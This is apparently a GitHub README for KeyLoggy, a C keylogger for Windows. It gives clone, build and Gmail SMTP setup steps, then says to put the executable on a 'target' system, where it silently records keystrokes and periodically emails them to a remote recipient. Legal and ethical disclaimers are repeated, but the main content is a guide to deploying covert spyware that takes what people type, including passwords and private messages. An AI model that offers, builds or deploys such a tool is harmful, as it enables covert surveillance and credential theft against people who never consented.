# KeyLoggy

## Description:

Keyloggy is a lightweight keylogger tool designed for monitoring keystrokes on Windows systems. It operates in stealth mode, capturing keyboard input and saving it to a log file. The tool periodically sends the logged data via email, allowing you to remotely monitor the recorded keystrokes. Keyloggy is intended for legal and ethical purposes, such as monitoring computer activity on authorized devices or conducting security audits.

**Please note that using this tool for unauthorized access to personal information or engaging in any malicious activities is strictly prohibited and may be illegal. Use this tool responsibly and adhere to applicable laws and regulations.**

## Installation:

To install and use Keyloggy, follow these steps:

1. Clone the repository or download the source code package.

   ```shell
   git clone https://github.com/Toothless5143/KeyLoggy.git && cd KeyLoggy
   ```

2. Open the code in your preferred C compiler or IDE.

3. Build the project to generate the executable file.

4. Ensure that the necessary dependencies (`windows.h`, `time.h`, and `winsock2.h`) are available. If any dependencies are missing, install them using the package manager for your development environment.

5. Customize the configuration options in the code, such as the log file name, email server, sender and recipient addresses, and other settings.

6. Obtain the SMTP server domain for sending emails via Gmail's SMTP server. Here's how:

   - Open your web browser and go to the Gmail website (https://www.gmail.com).
   - Log in to your Gmail account or create a new one if you don't have an account.
   - After logging in, click on the gear icon in the top right corner of the Gmail interface and select "Settings" from the dropdown menu.
   - In the Settings page, navigate to the "Accounts and Import" or "Accounts" tab.
   - Look for the "Send mail as" or "Send mail from another address" section. Here, you should see the email addresses you have configured to send emails from.
   - Identify the email address you want to use as the sender address in the code.
   - The SMTP server domain for Gmail is typically in the format smtp.gmail.com.
   - Replace the current value of GMAIL_SERVER in the code ("gmail-smtp-in.l.google.com") with the SMTP server domain you obtained from the previous step ("smtp.gmail.com").

7. Compile the code to create the Keyloggy executable file. If you are using GCC, you can compile the code with the following command:

   ```shell
   gcc -o keyloggy keyloggy.c
   ```

8. Ensure that the compiled executable is placed in a secure location on the target Windows system.

## Usage:

Before using Keyloggy, it is essential to understand and comply with legal and ethical guidelines. Misuse of this tool can breach privacy laws and infringe upon individuals' rights. Only use Keyloggy on devices for which you have proper authorization or have obtained informed consent from the device owner.

To use Keyloggy:

1. Transfer the compiled Keyloggy executable to the target Windows system.

2. Execute the Keyloggy executable on the target system.

3. The tool will operate in stealth mode, silently capturing keystrokes without any visible indication to the user.

4. The captured keystrokes will be stored in the specified log file.

5. Keyloggy periodically checks the log file, and if data is present, it will send an email with the logged keystrokes to the specified recipient address.

6. Monitor the email account associated with the recipient address to view the received logs.

7. Exercise caution when reviewing and handling the logged data to protect the privacy and confidentiality of individuals.

## Cautions:

It is crucial to exercise caution and adhere to legal and ethical guidelines when using Keyloggy:

1. Obtain proper authorization or informed consent from the device owner before using Keyloggy. Unauthorized monitoring of computer activity is illegal and unethical.

2. Respect privacy rights and only use Keyloggy for legitimate purposes, such as monitoring authorized devices or conducting security audits.

3. Ensure compliance with applicable laws and regulations related to privacy, data protection, and surveillance activities in your jurisdiction.

4. Do not use Keyloggy for malicious purposes or to gain unauthorized access to personal, sensitive, or confidential information.

5. Use Keyloggy responsibly and in accordance with the terms and conditions of the software license.

6. Be aware that the use of keyloggers may be subject to legal restrictions and may have implications for personal and organizational security.

7.Regularly review and update the tool to address any vulnerabilities or security issues that may arise.

Remember, the misuse of this tool can have severe legal and ethical consequences. Proceed with caution, ensure compliance with applicable laws, and respect individual privacy and rights.

## License:
This tool is open source and available under the [MIT License.](/LICENSE)

